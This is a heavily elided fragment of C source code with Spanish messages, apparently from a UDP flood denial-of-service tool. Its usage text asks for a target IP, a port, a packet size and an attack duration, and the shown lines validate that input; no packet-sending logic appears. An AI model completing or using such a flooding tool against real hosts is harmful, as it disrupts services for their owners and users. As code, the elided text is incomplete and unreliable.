...
//      char * send_data;
        ...
        if(argc == 1)
        {
                ...
                printf("-i\t= IP (v4) [REQUERIDA]\n");
                printf("-p\t= UDP Puerto (65535 o Menos)\n");
                printf("-s\t= Tamaño de Paquete (32000 o dos se bloqueará vps)\n");
                printf("-t\t= Tiempo de ataque en segundos [Default: 60]\n");
                exit(0);
        }
...
//      printf("IP: %s\nPort: %d\nPacket size: %d\nTime: %d\n", ip, port, packet_size, attack_time);
        ...
        if(ipflag == 0)
        {
                printf("Necesita establecer una dirección IP.\n");
                exit(0);
        }
        ...
        if(sizeflag == 1)
        {
                ...
                {
                        printf("Se acabó el tamaño del paquete 65500..\n");
                        exit(0);
                }
        }
        ...
        {
                printf("Error: dirección IP no válida (debe ser X.X.X.X con todos los números 255 o menos)\n");
                exit(0);
        }
